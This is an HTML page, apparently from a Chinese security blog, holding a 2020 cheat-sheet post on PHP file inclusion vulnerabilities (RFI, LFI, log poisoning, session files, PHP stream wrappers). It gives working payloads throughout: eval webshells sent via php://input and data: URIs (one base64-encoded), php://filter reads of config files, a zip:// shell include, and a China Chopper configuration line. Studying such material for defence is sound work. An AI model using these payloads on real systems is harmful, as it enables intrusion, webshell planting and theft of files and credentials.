@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>文件包含漏洞 - Go1f&#39;s Blog</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="go1f" /><meta name="description" content="文件包含漏洞" />
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.63.2" />
+
+
+<link rel="canonical" href="http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.0995afa14b62cd93e93cfc066b646c4c17a3eddca0e9d52a1d9dcf5d90aaacd3.css" integrity="sha256-CZWvoUtizZPpPPwGa2RsTBej7dyg6dUqHZ3PXZCqrNM=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="文件包含漏洞" />
+<meta property="og:description" content="文件包含漏洞" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
+<meta property="article:published_time" content="2020-01-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-01-19T00:00:00+00:00" />
+<meta itemprop="name" content="文件包含漏洞">
+<meta itemprop="description" content="文件包含漏洞">
+<meta itemprop="datePublished" content="2020-01-19T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-01-19T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1373">
+
+
+
+<meta itemprop="keywords" content="文件包含," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="文件包含漏洞"/>
+<meta name="twitter:description" content="文件包含漏洞"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Go1f&#39;s Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/">This is Home</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/post/">Archives</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/tags/">Tags</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/categories/">Categories</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/about/">About</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://go1f.cc:8000" rel="noopener" target="_blank">
+              external-link
+              
+              <i class="iconfont">
+                <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M623.36 272.96 473.216 423.04C467.2 429.056 467.072 438.656 472.896 444.416c0 0-6.72-6.656 1.6 1.6C496.064 467.648 528.64 500.224 528.64 500.224 534.464 506.048 544 505.856 550.016 499.904l150.08-150.144 67.328 66.432c9.024 8.96 27.456 4.544 30.4-8.96 19.968-92.608 46.656-227.52 46.656-227.52 6.848-34.496-16.192-56.704-49.92-49.92 0 0-134.656 26.816-227.328 46.784C560.32 178.048 556.352 182.272 554.752 187.136c-3.2 6.208-3.008 14.208 3.776 20.992L623.36 272.96z"></path>
+  <path d="M841.152 457.152c-30.528 0-54.784 24.512-54.784 54.656l0 274.752L237.696 786.56 237.696 237.696l206.016 0c6.656 0 10.752 0 13.248 0C487.68 237.696 512 213.184 512 182.848 512 152.32 487.36 128 456.96 128L183.04 128C153.216 128 128 152.576 128 182.848c0 3.136 0.256 6.272 0.768 9.28C128.256 195.136 128 198.272 128 201.408l0 639.488c0 0.064 0 0.192 0 0.256 0 0.128 0 0.192 0 0.32 0 30.528 24.512 54.784 54.784 54.784l646.976 0c6.592 0 9.728 0 11.712 0 28.736 0 52.928-22.976 54.464-51.968C896 843.264 896 842.304 896 841.344l0-20.352L896 561.408 896 512.128C896 481.792 871.424 457.152 841.152 457.152z"></path>
+</svg>
+
+              </i>
+            </a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Go1f&#39;s Blog
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/">This is Home</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/post/">Archives</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/tags/">Tags</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/categories/">Categories</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="http://go1f.cc/about/">About</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://go1f.cc:8000" rel="noopener" target="_blank">
+              external-link
+              
+              <i class="iconfont">
+                <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M623.36 272.96 473.216 423.04C467.2 429.056 467.072 438.656 472.896 444.416c0 0-6.72-6.656 1.6 1.6C496.064 467.648 528.64 500.224 528.64 500.224 534.464 506.048 544 505.856 550.016 499.904l150.08-150.144 67.328 66.432c9.024 8.96 27.456 4.544 30.4-8.96 19.968-92.608 46.656-227.52 46.656-227.52 6.848-34.496-16.192-56.704-49.92-49.92 0 0-134.656 26.816-227.328 46.784C560.32 178.048 556.352 182.272 554.752 187.136c-3.2 6.208-3.008 14.208 3.776 20.992L623.36 272.96z"></path>
+  <path d="M841.152 457.152c-30.528 0-54.784 24.512-54.784 54.656l0 274.752L237.696 786.56 237.696 237.696l206.016 0c6.656 0 10.752 0 13.248 0C487.68 237.696 512 213.184 512 182.848 512 152.32 487.36 128 456.96 128L183.04 128C153.216 128 128 152.576 128 182.848c0 3.136 0.256 6.272 0.768 9.28C128.256 195.136 128 198.272 128 201.408l0 639.488c0 0.064 0 0.192 0 0.256 0 0.128 0 0.192 0 0.32 0 30.528 24.512 54.784 54.784 54.784l646.976 0c6.592 0 9.728 0 11.712 0 28.736 0 52.928-22.976 54.464-51.968C896 843.264 896 842.304 896 841.344l0-20.352L896 561.408 896 512.128C896 481.792 871.424 457.152 841.152 457.152z"></path>
+</svg>
+
+              </i>
+            </a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">文件包含漏洞</h1>
+      
+      <div class="post-meta">
+        <time datetime="2020-01-19" class="post-time">
+          2020-01-19
+        </time>
+        <div class="post-category">
+            <a href="http://go1f.cc/categories/web%E5%AE%89%E5%85%A8/"> WEB安全 </a>
+            
+          </div>
+        
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#两个条件">两个条件</a></li>
+    <li><a href="#特征函数">特征函数</a></li>
+    <li><a href="#phpini">php.ini</a></li>
+    <li><a href="#rfi-远程文件包含">RFI 远程文件包含</a></li>
+    <li><a href="#lfi--本地文件包含">LFI  本地文件包含</a>
+      <ul>
+        <li><a href="#日志文件污染">日志文件污染</a></li>
+        <li><a href="#包含文件上传的临时文件httpsdlpacketstormsecuritynetpapersgenerallfi_with_phpinfo_assitancepdf">包含文件上传的临时文件</a></li>
+        <li><a href="#包含session文件httpswwwcnblogscomoran9ep8082962html">包含session文件</a></li>
+        <li><a href="#包含procselfenviron文件httpsblog51ctocompnig0s1992400182">包含/proc/self/environ文件</a></li>
+      </ul>
+    </li>
+    <li><a href="#伪协议">伪协议</a>
+      <ul>
+        <li><a href="#file协议">file:///协议</a></li>
+        <li><a href="#phpfilter">php://filter</a></li>
+        <li><a href="#phpinput">php://input</a></li>
+        <li><a href="#data协议">data:协议</a></li>
+        <li><a href="#phar协议">phar://协议</a></li>
+        <li><a href="#zip协议">zip://协议</a></li>
+        <li><a href="#类似协议">类似协议</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      <h2 id="两个条件">两个条件</h2>
+<ul>
+<li>用户能够控制文件内容</li>
+<li>include()等函数通过动态变量的方式引入需要包含的文件</li>
+</ul>
+<h2 id="特征函数">特征函数</h2>
+<ul>
+<li>
+<p>include（错误继续执行）、 require（错误后终止）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">include($_GET[&#39;file&#39;]);
+</code></pre></div><pre><code>http://127.0.0.1/upload/include.php?file=http://go1f.cc/p.txt&amp;=phpinfo();
+</code></pre></li>
+<li>
+<p>require_once 、include_once</p>
+</li>
+<li>
+<p>highlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()</p>
+</li>
+</ul>
+<h2 id="phpini">php.ini</h2>
+<p><strong>allow_url_include</strong>    默认关闭 since php5.2</p>
+<blockquote>
+<p>此选项允许有以下功能include，include_once，require，require_once使用URL的fopen封装。Whether to allow <strong>include/require</strong> to open URLs (like http:// or ftp://) as files.</p>
+<p>This setting requires allow_url_fopen to be on.  //需要allow_url_fopen开启才能开启</p>
+</blockquote>
+<p><strong>allow_url_fopen</strong>    默认开启 since php5.2</p>
+<blockquote>
+<p>Whether to allow the treatment of URLs (like http:// or ftp://) as files.</p>
+<p>限制 fopen， file_get_contents使用</p>
+</blockquote>
+<blockquote>
+<p>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。</p>
+<p>include会包含进入代码内，再解析执行一次。</p>
+</blockquote>
+<p><strong>不能通过.htaccess修改以上两个php_flag型的配置</strong></p>
+<p><a href="https://www.php.net/manual/en/configuration.changes.php#configuration.changes">How to change configuration settings</a></p>
+<blockquote>
+<p>&lsquo;allow_url_include&rsquo; is a &lsquo;PHP_INI_SYSTEM&rsquo; directive and hence cannot be set with the mod_php5 &lsquo;php_flag&rsquo;.</p>
+</blockquote>
+<p><strong>绕过方法</strong></p>
+<p><a href="https://paper.seebug.org/923/">PHP和SMB共享文件访问，绕过 URL 包含限制 </a></p>
+<h2 id="rfi-远程文件包含">RFI 远程文件包含</h2>
+<p>http://协议</p>
+<h2 id="lfi--本地文件包含">LFI  本地文件包含</h2>
+<p>可以写多几次，返回上一层目录<code>../../../../../../</code></p>
+<h3 id="日志文件污染">日志文件污染</h3>
+<p><strong>常见目录</strong></p>
+<p>/var/log/apache2/access.log</p>
+<p>/var/log/httpd/access.log</p>
+<p>/var/log/nginx/access.log</p>
+<p>​</p>
+<p><strong>污染</strong></p>
+<ul>
+<li>访问请求，控制UA或Referer</li>
+<li>nc发送到80端口</li>
+<li>直接污染一句话getshell</li>
+<li>迂回地污染恶意代码，譬如有关读取系统敏感文件（/root/.ssh/）</li>
+</ul>
+<p>大型网站日志，踩点，观察备份时间</p>
+<p><strong>Apache启用日志</strong>     apache2.conf</p>
+<pre><code class="language-conf" data-lang="conf">CustomLog &quot;logs/access.log&quot; combined
+; logfile with access, agent, and referer information
+</code></pre><h3 id="包含文件上传的临时文件httpsdlpacketstormsecuritynetpapersgenerallfi_with_phpinfo_assitancepdf"><a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf">包含文件上传的临时文件</a></h3>
+<p>​</p>
+<h3 id="包含session文件httpswwwcnblogscomoran9ep8082962html"><a href="https://www.cnblogs.com/Oran9e/p/8082962.html">包含session文件</a></h3>
+<p>常见的php-session存放位置：</p>
+<ol start="2">
+<li>/tmp[/sessions]/sess_PHPSESSID</li>
+<li>/var/lib/php5[/sessions]/sess_PHPSESSID</li>
+<li>/var/lib/php[/sessions]/sess_PHPSESSID</li>
+<li>C:/windows/temp[/sessions]/sess_PHPSESSID</li>
+</ol>
+<p>读取session以登录任意账号</p>
+<p>​</p>
+<h3 id="包含procselfenviron文件httpsblog51ctocompnig0s1992400182"><a href="https://blog.51cto.com/pnig0s1992/400182">包含/proc/self/environ文件</a></h3>
+<p>/proc/self/environ  #当前正在运行的进程的环境变量列表</p>
+<p>系统文件连接符：/proc/self/fd/&hellip;</p>
+<p>​</p>
+<h2 id="伪协议">伪协议</h2>
+<p><a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
+<h3 id="file协议">file:///协议</h3>
+<pre><code>file:///&lt;绝对路径&gt;
+</code></pre><p>只能使用<strong>绝对路径</strong></p>
+<!-- raw HTML omitted -->
+<h3 id="phpfilter">php://filter</h3>
+<p>读取敏感文件、base64转换读取代码、联动图片马等等。</p>
+<h4 id="--对本地文件进行读写">- 对本地文件进行读写</h4>
+<p>无使用条件: allow_url_fopen/allow_url_include on/off，可使用<strong>相对/绝对路径</strong></p>
+<p><strong>payload</strong></p>
+<pre><code>include.php?file=php://filter/resource=/etc/php5/apache2/php.ini
+
+#base64编码 convert.base64-encode
+include.php?file=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini
+</code></pre><p><strong>更多字符操作函数</strong></p>
+<blockquote>
+<p>read=string.toupper、tolower、rot13、strip_tags</p>
+</blockquote>
+<p><strong>拓展</strong></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
+<h4 id="--远程文件读取">- 远程文件读取</h4>
+<p>需要allow_url_include on 和 allow_url_fopen on</p>
+<pre><code>include.php?file=php://filter/resource=http://go1f.cc:8000/info.txt
+</code></pre><h3 id="phpinput">php://input</h3>
+<p><strong>条件</strong></p>
+<blockquote>
+<p>allow_url_include on</p>
+</blockquote>
+<p><strong>Payload</strong></p>
+<p>post内容填写一句话，不写键值对形式</p>
+<pre><code>POST /include.php?file=php://input HTTP/1.1
+Host: kokoisko.xyz:8001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+。。。
+。。。
+
+&lt;?php @eval($_POST(a));?&gt;  
+</code></pre><p><strong>联动菜刀</strong></p>
+<pre><code>配置栏填写：
+&lt;O&gt;&lt;?php @eval($_POST[a]);?&gt;&lt;/O&gt;
+</code></pre><p>​</p>
+<p>渗透境界：</p>
+<blockquote>
+<p><strong>无文件 input、data</strong></p>
+<p>无进程 进程注入</p>
+<p>无端口 icmp</p>
+</blockquote>
+<h3 id="data协议">data:协议</h3>
+<p><strong>格式</strong></p>
+<pre><code>data:[&lt;mime type&gt;][;charset=][;base64],&lt;encoded data&gt;
+</code></pre><p><strong>使用条件</strong></p>
+<blockquote>
+<p>allow_url_fopen on</p>
+<p>allow_url_include on</p>
+</blockquote>
+<p><strong>Payload</strong></p>
+<pre><code>include.php?file=data:text/plain,&lt;?php eval($_POST[a]);?&gt;
+#或者base64编码
+include.php?file=data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyAgPz4=
+</code></pre><h3 id="phar协议">phar://协议</h3>
+<p>读取压缩包内的文件。</p>
+<p>借助对压缩包文件的允许上传，也可以将tar/zip后缀改名为jpg等绕过后缀检测（无碍phar协议使用）。</p>
+<p><strong>条件</strong></p>
+<p>PHP&gt;=<strong>5.3.0</strong></p>
+<p>支持<strong>tar/zip</strong>，相对路径/绝对路径</p>
+<p><strong>Payload</strong></p>
+<pre><code>test.php?filename=phar://&lt;zipfile.zip&gt;[/&lt;dir&gt;]/&lt;filename&gt;
+</code></pre><h3 id="zip协议">zip://协议</h3>
+<p><strong>条件</strong></p>
+<p>相对路径、绝对路径</p>
+<p><strong>格式</strong></p>
+<pre><code>zip://绝对路径#[&lt;dirname&gt;/]&lt;filename.txt&gt;
+</code></pre><p><strong>Payload</strong></p>
+<p>压缩包不要求zip后缀，可以修改为jpg等后缀</p>
+<pre><code>include.php?file=zip://C:/MyProgram/phpstudy_pro/WWW/shell.jpg%23a.php
+</code></pre><p>注意：#在url为截断结束符，发送url编码%23代替</p>
+<h3 id="类似协议">类似协议</h3>
+<p>compress.bzip2://</p>
+<p>compress.zlib://</p>
+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">go1f</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2020-01-19
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="http://go1f.cc/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">文件上传漏洞</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="http://github.com/kokoisko" rel="me noopener" class="iconfont"
+      title="github"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
+</svg>
+
+    </a>
+
+
+<a href="http://go1f.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    2020
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        go1f
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.dee43230127a73d039a734510fa896c89c3c7ce0cf0be0c7a7433f8fd69b76dc.js" integrity="sha256-3uQyMBJ6c9A5pzRRD6iWyJw8fODPC&#43;DHp0M/j9abdtw=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
